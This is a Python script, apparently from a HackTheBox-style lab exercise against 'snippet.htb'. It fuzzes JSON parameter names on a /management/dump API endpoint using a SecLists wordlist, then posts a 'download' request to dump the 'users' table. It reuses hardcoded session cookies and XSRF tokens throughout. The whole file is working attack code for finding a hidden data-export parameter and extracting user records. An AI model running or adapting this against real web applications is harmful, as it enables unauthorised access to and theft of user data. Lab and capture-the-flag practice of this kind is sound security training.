#!/usr/bin/env python3

import requests
from time import sleep

words = []
with open ('/usr/share/seclists/Discovery/Web-Content/api/actions.txt', 'r') as file:
	for word in file.readlines():
		words.append(word.strip())

url = "http://snippet.htb/management/dump"
headers = {
	'Host': 'snippet.htb',
	"Origin": "http://snippet.htb",
	'Referer': 'http://snippet.htb/login',
	'Cookie': "XSRF-TOKEN=eyJpdiI6IitaWFNzTERHTjFRNjBOQXpvNi9qSFE9PSIsInZhbHVlIjoiYnpzb1lVQmtKejF4V3JSWmRqVGxPYmNEVVdUZGJQNnY0QVoyb0FnWndUbGZTZmFhTjMxcHVVR0RMQlpVYk5iaERWQitPR0RwS05LQWp6aHU2MzJaUkZFbFp1VnNuT3hFVEp2Z3FacXUzaHY3SlJIR21vWUZjYTlOSHJnQWhwbEYiLCJtYWMiOiJjMGMzMTQwNDYyYzcwYWM5MmUwYTA3YjgyNjljNjQ4Yjg5OGY5MmFlNWQ2M2NhNWQ2YTMyMDgyZDBmNDk3ZmNhIiwidGFnIjoiIn0%3D; snippethtb_session=eyJpdiI6IjBuY0hqMXBqLytROEIxNTNtMGJ3Mnc9PSIsInZhbHVlIjoidkRjMys5QS93UUR0aHZ0RWwyQ3lqTkh1bXRTKy9ocHFDbCs0UUNQeVVCMVg3S0RVQWpEa2JrR1ppQ0E1L1p4UjNZUUNVY0YyK0lUVExaRUNENnYrSEd0em1QZnBKd2hmMDNUNVV3dk4zSmgxcFpRWDdFd3BUZlNndm5WWGJyN2QiLCJtYWMiOiJmNmMyZTVkZDE2ZDM4MTYxNzNhOThjZTNkOGNkMjRkZGFjMmMzMjYyNjgzYzFhODk3MGMxMzk4Y2U5YzVjM2ZiIiwidGFnIjoiIn0%3D",
	'X-XSRF-TOKEN': 'eyJpdiI6IitaWFNzTERHTjFRNjBOQXpvNi9qSFE9PSIsInZhbHVlIjoiYnpzb1lVQmtKejF4V3JSWmRqVGxPYmNEVVdUZGJQNnY0QVoyb0FnWndUbGZTZmFhTjMxcHVVR0RMQlpVYk5iaERWQitPR0RwS05LQWp6aHU2MzJaUkZFbFp1VnNuT3hFVEp2Z3FacXUzaHY3SlJIR21vWUZjYTlOSHJnQWhwbEYiLCJtYWMiOiJjMGMzMTQwNDYyYzcwYWM5MmUwYTA3YjgyNjljNjQ4Yjg5OGY5MmFlNWQ2M2NhNWQ2YTMyMDgyZDBmNDk3ZmNhIiwidGFnIjoiIn0='
}

def fuzz():
	for word in words:
		data = {
			f"{word}": "foo"
		}
		print(f"Trying: {word}")
		r = requests.post(url, json=data, headers=headers)
		text = r.text
		if "Missing arguments" in text:
			print("Failed")
		else:
			print(f"{word} is a valid key!")
		sleep(0.5)

def dump(value):
	data = {
		"download": value
	}
	r = requests.post(url, json=data, headers=headers)
	return r.text

def main():
	juice = dump("users")
	print(juice)

if __name__ == "__main__":
	try:
		main()
	except KeyboardInterrupt:
		print("Exiting")
		exit()